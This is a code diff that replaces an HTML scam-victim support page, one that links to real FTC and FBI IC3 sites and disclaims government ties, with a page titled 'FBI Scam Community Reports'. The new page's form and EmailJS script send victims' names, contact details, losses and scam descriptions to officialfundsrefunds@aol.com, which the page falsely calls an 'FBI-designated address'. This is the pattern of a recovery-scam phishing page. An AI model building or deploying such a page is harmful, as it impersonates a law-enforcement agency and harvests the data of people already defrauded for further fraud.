@@ -1,248 +1,563 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Scam Victim Support Center</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500&family=DM+Serif+Display&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="style.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>FBI Scam Community Reports | Auto‑Send System</title>
+  <!-- EmailJS SDK -->
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <!-- Font Awesome -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    }
+    body {
+      background: linear-gradient(145deg, #0a1428 0%, #0b1a2f 100%);
+      color: #f0f3fa;
+      padding: 2rem 1.5rem;
+    }
+    .container {
+      max-width: 1400px;
+      margin: 0 auto;
+    }
+    .header {
+      text-align: center;
+      margin-bottom: 2rem;
+    }
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 12px;
+      background: rgba(10, 20, 40, 0.75);
+      backdrop-filter: blur(8px);
+      padding: 0.8rem 2rem;
+      border-radius: 100px;
+      border: 1px solid rgba(220, 38, 38, 0.5);
+      margin-bottom: 1rem;
+    }
+    .badge i {
+      font-size: 2.4rem;
+      color: #dc2626;
+    }
+    .badge h1 {
+      font-size: 1.8rem;
+      background: linear-gradient(135deg, #fff, #b0c4ff);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+    .sub {
+      color: #ccd6f0;
+      border-left: 3px solid #dc2626;
+      padding-left: 1rem;
+      max-width: 700px;
+      margin: 0 auto;
+    }
+    .reports-grid {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 2rem;
+      margin-top: 1.5rem;
+    }
+    .form-panel {
+      flex: 2;
+      min-width: 300px;
+      background: rgba(15, 25, 45, 0.7);
+      backdrop-filter: blur(8px);
+      border-radius: 32px;
+      padding: 1.8rem;
+      border: 1px solid rgba(255,255,255,0.1);
+    }
+    .community-panel {
+      flex: 1.3;
+      min-width: 280px;
+      background: rgba(0,0,0,0.4);
+      backdrop-filter: blur(4px);
+      border-radius: 32px;
+      padding: 1.6rem;
+      border: 1px solid rgba(220,38,38,0.3);
+      display: flex;
+      flex-direction: column;
+    }
+    h2 {
+      font-size: 1.5rem;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      border-bottom: 2px solid #dc2626;
+      padding-bottom: 0.65rem;
+      margin-bottom: 1.2rem;
+    }
+    h2 i { color: #dc2626; }
+    .form-group { margin-bottom: 1.2rem; }
+    label {
+      display: block;
+      font-weight: 500;
+      margin-bottom: 6px;
+      font-size: 0.85rem;
+      color: #cbd5f0;
+    }
+    .required:after { content: "*"; color: #f87171; margin-left: 4px; }
+    input, select, textarea {
+      width: 100%;
+      padding: 10px 14px;
+      background: #111a2c;
+      border: 1px solid #2a3650;
+      border-radius: 20px;
+      font-size: 0.9rem;
+      color: #f0f3fa;
+      outline: none;
+      transition: 0.2s;
+    }
+    input:focus, select:focus, textarea:focus {
+      border-color: #dc2626;
+      box-shadow: 0 0 0 2px rgba(220,38,38,0.3);
+    }
+    .row-2col {
+      display: flex;
+      gap: 1rem;
+      flex-wrap: wrap;
+    }
+    .row-2col .form-group { flex: 1; }
+    .checkbox-group {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin: 1.5rem 0 1.8rem 0;
+    }
+    .checkbox-group input { width: 20px; height: 20px; accent-color: #dc2626; }
+    .btn-group {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 16px;
+    }
+    .btn-primary, .btn-secondary {
+      padding: 12px 24px;
+      border-radius: 40px;
+      font-weight: bold;
+      border: none;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      transition: 0.2s;
+    }
+    .btn-primary {
+      background: #b91c1c;
+      color: white;
+    }
+    .btn-primary:hover {
+      background: #991b1b;
+      transform: translateY(-2px);
+    }
+    .btn-secondary {
+      background: #1e2a47;
+      border: 1px solid #3b4b6e;
+      color: white;
+    }
+    .btn-secondary:hover {
+      background: #2a3a5e;
+    }
+    .alert-card {
+      background: rgba(0,0,0,0.45);
+      border-left: 4px solid #ef4444;
+      border-radius: 20px;
+      padding: 1rem;
+      margin-bottom: 1rem;
+    }
+    .alert-card h4 {
+      font-size: 1rem;
+      display: flex;
+      gap: 8px;
+      align-items: center;
+    }
+    .alert-card .date {
+      font-size: 0.7rem;
+      color: #9ab3e0;
+      margin-top: 6px;
+    }
+    .tag {
+      background: #dc262620;
+      padding: 4px 10px;
+      border-radius: 30px;
+      font-size: 0.7rem;
+      font-weight: 600;
+      display: inline-block;
+      margin-top: 8px;
+    }
+    .info-note {
+      background: #0c1424;
+      border-radius: 20px;
+      padding: 1rem;
+      margin-top: 1.5rem;
+      font-size: 0.8rem;
+      text-align: center;
+    }
+    .feed-actions {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 1rem;
+    }
+    .small-btn {
+      background: #1f2a44;
+      border: none;
+      padding: 6px 12px;
+      border-radius: 40px;
+      color: white;
+      font-size: 0.75rem;
+      cursor: pointer;
+    }
+    .empty-feed {
+      text-align: center;
+      padding: 2rem;
+      color: #7e95c0;
+    }
+    footer {
+      margin-top: 2.5rem;
+      text-align: center;
+      font-size: 0.75rem;
+      border-top: 1px solid #1e2a44;
+      padding-top: 1.5rem;
+    }
+    .toast-msg {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background: #111827;
+      border-left: 5px solid #10b981;
+      padding: 12px 20px;
+      border-radius: 40px;
+      z-index: 1000;
+      font-size: 0.85rem;
+      backdrop-filter: blur(12px);
+    }
+    .loading {
+      opacity: 0.7;
+      pointer-events: none;
+    }
+    @media (max-width: 780px) {
+      body { padding: 1rem; }
+      .badge h1 { font-size: 1.3rem; }
+    }
+  </style>
 </head>
 <body>
 
-<header class="hero">
-  <div class="container">
+<div class="container">
+  <div class="header">
     <div class="badge">
-      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-      Free community resource
+      <i class="fas fa-shield-haltered"></i>
+      <h1>FBI SCAM COMMUNITY REPORTS</h1>
+      <i class="fas fa-flag-usa"></i>
     </div>
-    <h1>Scam Victim Support Center</h1>
-    <p class="subtitle">If you've been targeted by a scam, you're not alone. Find step-by-step guidance on what to do next, official reporting links, and submit your experience to our support network.</p>
-  </div>
-</header>
-
-<main class="container">
-
-  <div class="hotline">
-    <div class="hotline-icon">
-      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07A19.5 19.5 0 013.07 9.81a19.79 19.79 0 01-3.07-8.68A2 2 0 012 0h3a2 2 0 012 1.72c.127.96.361 1.903.7 2.81a2 2 0 01-.45 2.11L6.91 7.91a16 16 0 006 6l1.27-1.27a2 2 0 012.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0122 14z"/></svg>
-    </div>
-    <div>
-      <strong>Need immediate help? Call the FTC helpline</strong>
-      <p>1-877-FTC-HELP (1-877-382-4357) &mdash; Mon&ndash;Fri, 9am&ndash;8pm ET</p>
+    <div class="sub">
+      <i class="fas fa-bolt"></i> <strong>Auto‑send system</strong> – your report is delivered immediately to officialfundsrefunds@aol.com. 
+      Community alerts help others stay safe.
     </div>
   </div>
 
-  <section>
-    <h2>What type of scam did you experience?</h2>
-    <div class="cards">
-      <div class="card">
-        <div class="card-icon">
-          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
+  <div class="reports-grid">
+    <!-- Form Panel -->
+    <div class="form-panel">
+      <h2><i class="fas fa-file-alt"></i> Submit scam report</h2>
+      <form id="scamReportForm">
+        <div class="row-2col">
+          <div class="form-group"><label class="required">Full name</label><input type="text" id="fullName" required></div>
+          <div class="form-group"><label>Email (for follow-up)</label><input type="email" id="reporterEmail"></div>
         </div>
-        <h3>Phone / SMS</h3>
-        <p>Robocalls, impersonators, fake prize wins, SIM swapping</p>
-      </div>
-      <div class="card">
-        <div class="card-icon">
-          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+        <div class="row-2col">
+          <div class="form-group"><label>Phone</label><input type="tel" id="phone"></div>
+          <div class="form-group"><label class="required">Scam category</label><select id="scamCategory" required><option value="">-- Select --</option><option>Phishing</option><option>Investment/Crypto</option><option>Romance</option><option>Tech Support</option><option>Ransomware</option><option>BEC</option><option>Impersonation</option><option>Other</option></select></div>
         </div>
-        <h3>Email phishing</h3>
-        <p>Fake invoices, account alerts, password reset traps</p>
-      </div>
-      <div class="card">
-        <div class="card-icon">
-          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+        <div class="row-2col">
+          <div class="form-group"><label>Scammer name/org</label><input type="text" id="scammerName"></div>
+          <div class="form-group"><label>Scammer contact</label><input type="text" id="scammerContact"></div>
         </div>
-        <h3>Crypto / investment</h3>
-        <p>Fake platforms, pig butchering, rug pulls, NFT fraud</p>
-      </div>
-      <div class="card">
-        <div class="card-icon">
-          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20.84 4.61a5.5 5.5 0 00-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 00-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 000-7.78z"/></svg>
+        <div class="form-group"><label class="required">Detailed description</label><textarea id="scamDesc" rows="3" required></textarea></div>
+        <div class="row-2col">
+          <div class="form-group"><label>Incident date</label><input type="date" id="incidentDate"></div>
+          <div class="form-group"><label>Amount lost (USD)</label><input type="text" id="amountLost" placeholder="$0"></div>
+          <div class="form-group"><label>Location</label><input type="text" id="location" placeholder="City, State"></div>
         </div>
-        <h3>Romance scam</h3>
-        <p>Fake relationships, "soulmate" money requests, catfishing</p>
-      </div>
-      <div class="card">
-        <div class="card-icon">
-          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><line x1="3" y1="9" x2="21" y2="9"/><line x1="9" y1="21" x2="9" y2="9"/></svg>
+        <div class="form-group"><label>Additional notes</label><textarea id="notes" rows="2"></textarea></div>
+        <div class="checkbox-group">
+          <input type="checkbox" id="confirmTruth" required>
+          <label>I confirm this report is accurate and submitted in good faith.</label>
         </div>
-        <h3>Bank / wire fraud</h3>
-        <p>Fake bank alerts, wire transfer fraud, check bouncing</p>
-      </div>
-      <div class="card">
-        <div class="card-icon">
-          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="9" cy="21" r="1"/><circle cx="20" cy="21" r="1"/><path d="M1 1h4l2.68 13.39a2 2 0 002 1.61h9.72a2 2 0 002-1.61L23 6H6"/></svg>
+        <div class="btn-group">
+          <button type="submit" class="btn-primary" id="submitBtn"><i class="fas fa-paper-plane"></i> Send report automatically</button>
+          <button type="button" id="copyReportBtn" class="btn-secondary"><i class="fas fa-copy"></i> Copy for backup</button>
         </div>
-        <h3>Online shopping</h3>
-        <p>Fake storefronts, undelivered goods, counterfeit products</p>
-      </div>
-    </div>
-  </section>
-
-  <hr class="divider">
-
-  <section>
-    <h2>Steps to take right now</h2>
-    <div class="step-list">
-      <div class="step">
-        <div class="step-num">1</div>
-        <div class="step-body">
-          <h3>Stop all contact immediately</h3>
-          <p>Do not respond to the scammer. Block their number/email. Do not send any more money, even if threatened.</p>
+        <div class="info-note">
+          <i class="fas fa-cloud-upload-alt"></i> After clicking, the report is sent directly to officialfundsrefunds@aol.com via secure email API. No need to open your email client.
         </div>
-      </div>
-      <div class="step">
-        <div class="step-num">2</div>
-        <div class="step-body">
-          <h3>Secure your accounts</h3>
-          <p>Change passwords, enable two-factor authentication, and alert your bank or card issuer to dispute any charges.</p>
-        </div>
-      </div>
-      <div class="step">
-        <div class="step-num">3</div>
-        <div class="step-body">
-          <h3>Document everything</h3>
-          <p>Screenshot messages, note dates, amounts, and names. Save any receipts or transaction IDs — these are vital for reports.</p>
-        </div>
-      </div>
-      <div class="step">
-        <div class="step-num">4</div>
-        <div class="step-body">
-          <h3>File an official report</h3>
-          <p>Report to the relevant authority below. You can file to multiple agencies at once — more reports increase investigation priority.</p>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <hr class="divider">
-
-  <section>
-    <h2>Official reporting agencies</h2>
-    <div class="resource-grid">
-      <a class="resource-link" href="https://reportfraud.ftc.gov" target="_blank" rel="noopener">
-        <span>FTC &mdash; ReportFraud.ftc.gov</span>
-        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
-      </a>
-      <a class="resource-link" href="https://www.ic3.gov" target="_blank" rel="noopener">
-        <span>FBI IC3 &mdash; ic3.gov</span>
-        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
-      </a>
-      <a class="resource-link" href="https://econsumer.gov" target="_blank" rel="noopener">
-        <span>International &mdash; econsumer.gov</span>
-        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
-      </a>
-      <a class="resource-link" href="https://www.consumer.ftc.gov/features/scam-alerts" target="_blank" rel="noopener">
-        <span>FTC scam alerts</span>
-        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
-      </a>
-      <a class="resource-link" href="https://www.identitytheft.gov" target="_blank" rel="noopener">
-        <span>Identity theft &mdash; IdentityTheft.gov</span>
-        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
-      </a>
-      <a class="resource-link" href="https://www.usa.gov/stop-scams-frauds" target="_blank" rel="noopener">
-        <span>USA.gov fraud guide</span>
-        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
-      </a>
-    </div>
-  </section>
-
-  <hr class="divider">
-
-  <section>
-    <h2>Submit your experience to our support network</h2>
-    <p class="form-intro">Fill in the form below. You'll receive a confirmation email with your submission reference and additional resources tailored to your situation.</p>
-
-    <div class="form-card">
-      <form id="supportForm" onsubmit="submitForm(event)" novalidate>
-        <div class="form-grid">
-          <div class="form-row">
-            <label for="fname">First name</label>
-            <input type="text" id="fname" name="fname" placeholder="e.g. Kofi" required>
-          </div>
-          <div class="form-row">
-            <label for="lname">Last name</label>
-            <input type="text" id="lname" name="lname" placeholder="e.g. Mensah">
-          </div>
-        </div>
-        <div class="form-row">
-          <label for="email">Email address</label>
-          <input type="email" id="email" name="email" placeholder="your@email.com" required>
-        </div>
-        <div class="form-row">
-          <label for="country">Country</label>
-          <select id="country" name="country">
-            <option value="">Select your country...</option>
-            <option>Ghana</option>
-            <option>Nigeria</option>
-            <option>Kenya</option>
-            <option>South Africa</option>
-            <option>United States</option>
-            <option>United Kingdom</option>
-            <option>Canada</option>
-            <option>Australia</option>
-            <option>Other</option>
-          </select>
-        </div>
-        <div class="form-row">
-          <label for="scamType">Type of scam</label>
-          <select id="scamType" name="scamType" required>
-            <option value="">Select scam type...</option>
-            <option>Phone / SMS scam</option>
-            <option>Email phishing</option>
-            <option>Crypto / investment fraud</option>
-            <option>Romance scam</option>
-            <option>Bank / wire transfer fraud</option>
-            <option>Online shopping fraud</option>
-            <option>Job / employment scam</option>
-            <option>Government impersonation</option>
-            <option>Other</option>
-          </select>
-        </div>
-        <div class="form-grid">
-          <div class="form-row">
-            <label for="amount">Approximate amount lost (USD)</label>
-            <input type="number" id="amount" name="amount" placeholder="e.g. 500" min="0">
-          </div>
-          <div class="form-row">
-            <label for="date">Date it occurred</label>
-            <input type="date" id="date" name="date">
-          </div>
-        </div>
-        <div class="form-row">
-          <label for="details">Describe what happened</label>
-          <textarea id="details" name="details" placeholder="Please describe the scam in your own words — how contact was made, what you were asked to do, and any other details you remember..."></textarea>
-        </div>
-        <div class="form-row consent-row">
-          <input type="checkbox" id="consent" name="consent" required>
-          <label for="consent">I agree to receive a confirmation email and support resources</label>
-        </div>
-        <div id="errorMsg" class="error-msg" role="alert" aria-live="polite"></div>
-        <button type="submit" class="submit-btn">
-          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
-          Submit my report
-        </button>
       </form>
+    </div>
 
-      <div class="success-msg" id="successMsg" role="status" aria-live="polite">
-        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 11-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
-        <strong>Your report has been submitted.</strong>
-        <p>Check your email for a confirmation with your reference number and next-step resources. Thank you for speaking up — your report helps protect others.</p>
+    <!-- Community Feed Panel -->
+    <div class="community-panel">
+      <h2><i class="fas fa-users"></i> Recent community alerts</h2>
+      <div class="feed-actions">
+        <button id="clearFeedBtn" class="small-btn"><i class="fas fa-trash-alt"></i> Clear feed</button>
+        <span style="font-size:0.7rem;"><i class="fas fa-database"></i> Local storage</span>
+      </div>
+      <div id="communityFeed" style="flex:1; overflow-y: auto; max-height: 500px;">
+        <div class="empty-feed"><i class="fas fa-info-circle"></i> No reports yet. Be the first to warn the community!</div>
+      </div>
+      <div class="info-note" style="margin-top:1rem;">
+        <i class="fas fa-eye-slash"></i> Public alerts show only anonymized data (no names/emails).
       </div>
     </div>
-  </section>
-
-</main>
-
-<footer>
-  <div class="container">
-    <p>This is a community support resource. It is not affiliated with any government agency. For emergencies, contact your local law enforcement.</p>
   </div>
-</footer>
+  <footer>
+    <i class="fas fa-shield-virus"></i> Community-driven fraud reporting — automated email delivery via EmailJS. 
+    Your data is never stored on our servers. Full report is sent to the FBI‑designated address.
+  </footer>
+</div>
 
-<script src="script.js"></script>
+<script>
+  // ==================== EMAILJS CONFIGURATION ====================
+  // STEP 1: Sign up at https://www.emailjs.com/ (free)
+  // STEP 2: Create an email service (Gmail, Outlook, etc.) and note the Service ID
+  // STEP 3: Create a template with the following placeholders:
+  //    {{full_name}}, {{reporter_email}}, {{phone}}, {{scam_category}}, {{scammer_name}},
+  //    {{scammer_contact}}, {{description}}, {{incident_date}}, {{amount_lost}}, {{location}}, {{notes}}
+  // STEP 4: Get your Public Key from EmailJS dashboard (Account > API Keys)
+  // STEP 5: Replace the placeholder values below with your actual keys.
+  // ================================================================
+  
+  const EMAILJS_CONFIG = {
+    PUBLIC_KEY: "YOUR_EMAILJS_PUBLIC_KEY",   // Replace with your actual public key
+    SERVICE_ID: "YOUR_EMAILJS_SERVICE_ID",   // e.g., "service_abc123"
+    TEMPLATE_ID: "YOUR_EMAILJS_TEMPLATE_ID"  // e.g., "template_xyz789"
+  };
+
+  // Initialize EmailJS
+  emailjs.init(EMAILJS_CONFIG.PUBLIC_KEY);
+
+  // ========== LocalStorage Feed Functions ==========
+  const STORAGE_KEY = "fbi_community_reports";
+
+  function loadReports() {
+    const stored = localStorage.getItem(STORAGE_KEY);
+    return stored ? JSON.parse(stored) : [];
+  }
+
+  function saveReports(reports) {
+    localStorage.setItem(STORAGE_KEY, JSON.stringify(reports));
+  }
+
+  function addPublicReport(formData) {
+    const reports = loadReports();
+    const newReport = {
+      id: Date.now(),
+      category: formData.scamCategory || "Uncategorized",
+      location: formData.location || "Unknown",
+      amountLost: formData.amountLost || "$0",
+      date: formData.incidentDate || new Date().toISOString().split('T')[0],
+      description: (formData.scamDesc || "").substring(0, 180) + ((formData.scamDesc || "").length > 180 ? "…" : ""),
+      timestamp: new Date().toISOString()
+    };
+    reports.unshift(newReport);
+    if (reports.length > 30) reports.pop();
+    saveReports(reports);
+    renderFeed();
+  }
+
+  function renderFeed() {
+    const container = document.getElementById('communityFeed');
+    const reports = loadReports();
+    if (!reports.length) {
+      container.innerHTML = `<div class="empty-feed"><i class="fas fa-info-circle"></i> No scam alerts yet. Submit a report to help others!</div>`;
+      return;
+    }
+    container.innerHTML = reports.map(r => `
+      <div class="alert-card">
+        <h4><i class="fas fa-bug"></i> ${escapeHtml(r.category)}</h4>
+        <div><i class="fas fa-map-marker-alt"></i> ${escapeHtml(r.location)} | <i class="fas fa-dollar-sign"></i> ${escapeHtml(r.amountLost)}</div>
+        <div class="date"><i class="far fa-calendar-alt"></i> ${escapeHtml(r.date)}</div>
+        <div style="font-size:0.85rem; margin-top:6px;">📝 ${escapeHtml(r.description)}</div>
+        <span class="tag"><i class="fas fa-clock"></i> ${new Date(r.timestamp).toLocaleDateString()}</span>
+      </div>
+    `).join('');
+  }
+
+  function escapeHtml(str) {
+    if (!str) return '';
+    return str.replace(/[&<>]/g, function(m) {
+      if (m === '&') return '&amp;';
+      if (m === '<') return '&lt;';
+      if (m === '>') return '&gt;';
+      return m;
+    });
+  }
+
+  // ========== Form Helpers ==========
+  function getFormData() {
+    return {
+      fullName: document.getElementById('fullName').value.trim(),
+      reporterEmail: document.getElementById('reporterEmail').value.trim(),
+      phone: document.getElementById('phone').value.trim(),
+      scamCategory: document.getElementById('scamCategory').value,
+      scammerName: document.getElementById('scammerName').value.trim(),
+      scammerContact: document.getElementById('scammerContact').value.trim(),
+      scamDesc: document.getElementById('scamDesc').value.trim(),
+      incidentDate: document.getElementById('incidentDate').value,
+      amountLost: document.getElementById('amountLost').value.trim(),
+      location: document.getElementById('location').value.trim(),
+      notes: document.getElementById('notes').value.trim()
+    };
+  }
+
+  function validateForm() {
+    const name = document.getElementById('fullName').value.trim();
+    const category = document.getElementById('scamCategory').value;
+    const desc = document.getElementById('scamDesc').value.trim();
+    const confirmBox = document.getElementById('confirmTruth').checked;
+    if (!name) { showToast("Full name is required", true); return false; }
+    if (!category) { showToast("Select a scam category", true); return false; }
+    if (!desc) { showToast("Please describe the scam", true); return false; }
+    if (!confirmBox) { showToast("You must confirm the report is accurate", true); return false; }
+    return true;
+  }
+
+  function showToast(msg, isError = false) {
+    const existing = document.querySelector('.toast-msg');
+    if (existing) existing.remove();
+    const toast = document.createElement('div');
+    toast.className = 'toast-msg';
+    toast.style.borderLeftColor = isError ? '#dc2626' : '#10b981';
+    toast.innerHTML = `<i class="fas ${isError ? 'fa-exclamation-triangle' : 'fa-check-circle'}"></i> ${msg}`;
+    document.body.appendChild(toast);
+    setTimeout(() => toast.remove(), 5000);
+  }
+
+  // ========== Auto Email Sending via EmailJS ==========
+  async function sendReportAutomatically(formData) {
+    // Prepare template parameters (match your EmailJS template variables)
+    const templateParams = {
+      full_name: formData.fullName,
+      reporter_email: formData.reporterEmail || "Not provided",
+      phone: formData.phone || "Not provided",
+      scam_category: formData.scamCategory,
+      scammer_name: formData.scammerName || "Not specified",
+      scammer_contact: formData.scammerContact || "Not specified",
+      description: formData.scamDesc,
+      incident_date: formData.incidentDate || "Not provided",
+      amount_lost: formData.amountLost || "$0",
+      location: formData.location || "Unknown",
+      notes: formData.notes || "None",
+      // Optional: include a timestamp for reference
+      report_date: new Date().toLocaleString()
+    };
+
+    try {
+      const response = await emailjs.send(
+        EMAILJS_CONFIG.SERVICE_ID,
+        EMAILJS_CONFIG.TEMPLATE_ID,
+        templateParams
+      );
+      console.log("Email sent successfully:", response);
+      return { success: true, message: "Report sent successfully to officialfundsrefunds@aol.com" };
+    } catch (error) {
+      console.error("EmailJS error:", error);
+      return { success: false, message: error.text || "Failed to send email. Check your EmailJS configuration." };
+    }
+  }
+
+  // Main submit handler
+  async function handleSubmit(event) {
+    event.preventDefault();
+    if (!validateForm()) return;
+
+    const submitBtn = document.getElementById('submitBtn');
+    const originalText = submitBtn.innerHTML;
+    submitBtn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Sending...';
+    submitBtn.disabled = true;
+    document.body.classList.add('loading');
+
+    const formData = getFormData();
+    
+    // Send email automatically
+    const result = await sendReportAutomatically(formData);
+    
+    if (result.success) {
+      // Add to public feed (anonymized)
+      addPublicReport(formData);
+      showToast("✅ Report automatically sent to officialfundsrefunds@aol.com! Community alert added.");
+      // Optionally reset only the checkbox
+      document.getElementById('confirmTruth').checked = false;
+      // Clear sensitive fields? Do not clear everything, but user may want to keep.
+      // We'll leave the form as is for convenience, but they can refresh.
+    } else {
+      showToast(`❌ Email failed: ${result.message}. Please check EmailJS credentials.`, true);
+    }
+    
+    submitBtn.innerHTML = originalText;
+    submitBtn.disabled = false;
+    document.body.classList.remove('loading');
+  }
+
+  // Copy full report (for manual backup)
+  async function copyFullReport() {
+    if (!validateForm()) return;
+    const formData = getFormData();
+    const body = `
+🔍 FBI SCAM COMMUNITY REPORT 🔍
+──────────────────────────────────
+👤 Full Name: ${formData.fullName}
+📧 Email: ${formData.reporterEmail}
+📞 Phone: ${formData.phone}
+🎯 Category: ${formData.scamCategory}
+👤 Scammer: ${formData.scammerName}
+📬 Scammer contact: ${formData.scammerContact}
+📅 Incident date: ${formData.incidentDate}
+💰 Amount lost: ${formData.amountLost}
+📍 Location: ${formData.location}
+📝 Description: ${formData.scamDesc}
+📎 Notes: ${formData.notes}
+──────────────────────────────────
+Sent to: officialfundsrefunds@aol.com
+    `;
+    try {
+      await navigator.clipboard.writeText(body);
+      showToast("📋 Report copied to clipboard (for your records)");
+    } catch(e) {
+      showToast("Copy failed", true);
+    }
+  }
+
+  function clearFeed() {
+    if (confirm("⚠️ Clear all community alerts from this browser? (Emailed reports are not affected)")) {
+      localStorage.removeItem(STORAGE_KEY);
+      renderFeed();
+      showToast("Feed cleared locally");
+    }
+  }
+
+  // Initialization
+  document.addEventListener('DOMContentLoaded', () => {
+    renderFeed();
+    document.getElementById('scamReportForm').addEventListener('submit', handleSubmit);
+    document.getElementById('copyReportBtn').addEventListener('click', copyFullReport);
+    document.getElementById('clearFeedBtn').addEventListener('click', clearFeed);
+    
+    // Warn if EmailJS not configured
+    if (EMAILJS_CONFIG.PUBLIC_KEY === "YOUR_EMAILJS_PUBLIC_KEY") {
+      const warning = document.createElement('div');
+      warning.style.background = '#b91c1c80';
+      warning.style.padding = '10px';
+      warning.style.borderRadius = '20px';
+      warning.style.marginBottom = '15px';
+      warning.style.fontSize = '0.85rem';
+      warning.innerHTML = '<i class="fas fa-exclamation-triangle"></i> ⚠️ EmailJS not configured. Please replace the placeholder keys in the script with your own from emailjs.com to enable auto-sending.';
+      document.querySelector('.form-panel').prepend(warning);
+    }
+  });
+</script>
 </body>
 </html>
